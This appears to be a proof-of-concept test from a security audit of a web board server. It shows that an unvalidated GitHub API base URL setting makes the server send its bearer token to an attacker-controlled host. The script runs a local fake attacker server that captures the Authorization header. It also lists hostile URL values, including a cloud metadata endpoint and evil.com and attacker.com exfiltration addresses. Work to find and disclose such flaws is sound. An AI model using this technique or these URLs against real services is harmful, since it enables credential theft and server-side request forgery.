import http from 'node:http';
import { spawn } from 'node:child_process';
import assert from 'node:assert/strict';
import { loadConfig } from '../../../../../web/server/config.ts';

console.log('=== Proof 1: BOARD_GITHUB_API_BASE Exfiltrates Token on Startup ===');

const stolenHeaders = [];
let capturedPath = '';

const fakeAttackerServer = http.createServer((req, res) => {
  capturedPath = req.url;
  stolenHeaders.push(req.headers);
  // Return 401 to terminate startup
  res.writeHead(401, { 'content-type': 'application/json' });
  res.end(JSON.stringify({ message: 'Bad credentials' }));
});

await new Promise((resolve) => fakeAttackerServer.listen(0, '127.0.0.1', resolve));
const attackerPort = fakeAttackerServer.address().port;
const attackerUrl = `http://127.0.0.1:${attackerPort}`;

const SECRET_BOT_TOKEN = 'ghp_secret_production_bot_token_99999999';

const child = spawn(process.execPath, ['web/server.ts'], {
  env: {
    PATH: process.env.PATH,
    BOARD_GITHUB_TOKEN: SECRET_BOT_TOKEN,
    BOARD_GITHUB_LOGIN: 'bot-account',
    BOARD_REPO: 'org/repo',
    BOARD_PASSWORD: 'password12345',
    BOARD_SESSION_SECRET: 'session-secret-that-is-at-least-32-characters-long',
    BOARD_HOST: '127.0.0.1',
    BOARD_PORT: '18991',
    BOARD_GITHUB_API_BASE: attackerUrl,
  },
  stdio: ['ignore', 'pipe', 'pipe'],
});

let stderr = '';
child.stderr.on('data', (d) => (stderr += d));

await new Promise((resolve) => child.on('close', resolve));
await new Promise((resolve) => fakeAttackerServer.close(resolve));

console.log('Target endpoint reached:', capturedPath);
assert.equal(capturedPath, '/user');
assert.ok(stolenHeaders.length > 0, 'attacker server received request');
const authHeader = stolenHeaders[0]['authorization'];
console.log('Captured Authorization header present:', Boolean(authHeader));
console.log('Captured Authorization header scheme:', authHeader?.split(' ')[0]);
console.log('Captured token matches secret bot token:', authHeader === `Bearer ${SECRET_BOT_TOKEN}`);
assert.equal(authHeader, `Bearer ${SECRET_BOT_TOKEN}`);

console.log('\n=== Proof 2: loadConfig does zero validation on BOARD_GITHUB_API_BASE ===');
const dangerousValues = [
  'http://169.254.169.254/latest/meta-data',
  'ftp://evil.com/exfil',
  'not-even-a-url',
  'http://attacker.com:8080/steal?token=param',
];

for (const val of dangerousValues) {
  const cfg = loadConfig({
    BOARD_GITHUB_TOKEN: 'ghp_token_000000000000',
    BOARD_GITHUB_LOGIN: 'login',
    BOARD_REPO: 'owner/repo',
    BOARD_PASSWORD: 'password12345',
    BOARD_SESSION_SECRET: 'session-secret-that-is-at-least-32-characters-long',
    BOARD_GITHUB_API_BASE: val,
  });
  console.log(`Accepted without error: "${val}" -> cfg.githubApiBase: "${cfg.githubApiBase}"`);
  assert.equal(cfg.githubApiBase, val);
}

console.log('\nResult: Unvalidated upstream URL accepts arbitrary targets and exfiltrates Bearer token.');
